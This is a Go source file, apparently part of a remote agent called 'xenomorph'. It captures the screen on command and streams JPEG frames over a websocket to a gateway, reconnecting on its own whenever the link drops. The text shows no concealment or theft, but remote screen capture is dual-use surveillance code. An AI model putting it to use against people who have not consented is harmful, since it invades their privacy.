package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"image"
	"image/jpeg"
	_ "image/png"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"

	"github.com/codevault-llc/xenomorph/platform/client/internal/agent"
)

const (
	defaultScreenStreamFPS = 30
	maxScreenStreamFPS     = 60
	defaultJPEGQuality     = 70
)

type screenStreamPayload struct {
	FPS     int `json:"fps"`
	Quality int `json:"quality"`
}

type screenStreamer struct {
	gatewayURL string
	tlsConfig  *tls.Config

	mu     sync.Mutex
	cancel context.CancelFunc
}

func newScreenStreamer(gatewayURL string, tlsConfig *tls.Config) *screenStreamer {
	return &screenStreamer{
		gatewayURL: gatewayURL,
		tlsConfig:  tlsConfig,
	}
}

func (s *screenStreamer) Start(payload json.RawMessage) error {
	if s == nil {
		return nil
	}

	config := screenStreamPayload{FPS: defaultScreenStreamFPS}
	if len(payload) > 0 {
		if err := json.Unmarshal(payload, &config); err != nil {
			return fmt.Errorf("decode screen stream payload: %w", err)
		}
	}
	fps := clampScreenFPS(config.FPS)
	quality := clampJPEGQuality(config.Quality)

	s.mu.Lock()
	if s.cancel != nil {
		s.cancel()
	}
	ctx, cancel := context.WithCancel(context.Background())
	s.cancel = cancel
	s.mu.Unlock()

	go s.run(ctx, fps, quality)
	return nil
}

func (s *screenStreamer) Stop() {
	if s == nil {
		return
	}

	s.mu.Lock()
	if s.cancel != nil {
		s.cancel()
		s.cancel = nil
	}
	s.mu.Unlock()
}

func (s *screenStreamer) run(ctx context.Context, fps int, quality int) {
	for ctx.Err() == nil {
		conn, err := s.dial(ctx)
		if err != nil {
			waitBeforeReconnect(ctx)
			continue
		}
		s.writeFrames(ctx, conn, fps, quality)
		_ = conn.Close()
		waitBeforeReconnect(ctx)
	}
}

func (s *screenStreamer) writeFrames(ctx context.Context, conn *websocket.Conn, fps int, quality int) {
	ticker := time.NewTicker(time.Second / time.Duration(fps))
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			frame, err := captureScreenJPEG(quality)
			if err != nil {
				continue
			}
			if err := conn.WriteMessage(websocket.BinaryMessage, frame); err != nil {
				return
			}
		}
	}
}

func (s *screenStreamer) dial(ctx context.Context) (*websocket.Conn, error) {
	u, err := url.Parse(s.gatewayURL)
	if err != nil {
		return nil, fmt.Errorf("parse gateway url: %w", err)
	}
	switch u.Scheme {
	case "https":
		u.Scheme = "wss"
	case "http":
		u.Scheme = "ws"
	default:
		return nil, fmt.Errorf("unsupported gateway scheme %q", u.Scheme)
	}
	u.Path = strings.TrimRight(u.Path, "/") + "/screen/media"
	q := u.Query()
	q.Set("content_type", "image/jpeg")
	u.RawQuery = q.Encode()

	dialer := websocket.Dialer{TLSClientConfig: s.tlsConfig}
	conn, _, err := dialer.DialContext(ctx, u.String(), nil)
	return conn, err
}

func clampScreenFPS(value int) int {
	if value <= 0 {
		return defaultScreenStreamFPS
	}
	if value > maxScreenStreamFPS {
		return maxScreenStreamFPS
	}
	return value
}

func clampJPEGQuality(value int) int {
	if value <= 0 {
		return defaultJPEGQuality
	}
	if value > 100 {
		return 100
	}
	return value
}

func captureScreenJPEG(quality int) ([]byte, error) {
	data, err := agent.CaptureScreenshot()
	if err != nil {
		return nil, err
	}

	img, _, err := image.Decode(bytes.NewReader(data))
	if err != nil {
		return nil, fmt.Errorf("decode screenshot: %w", err)
	}

	var out bytes.Buffer
	if err := jpeg.Encode(&out, img, &jpeg.Options{Quality: quality}); err != nil {
		return nil, fmt.Errorf("encode jpeg: %w", err)
	}
	return out.Bytes(), nil
}

func waitBeforeReconnect(ctx context.Context) {
	timer := time.NewTimer(500 * time.Millisecond)
	defer timer.Stop()

	select {
	case <-ctx.Done():
	case <-timer.C:
	}
}
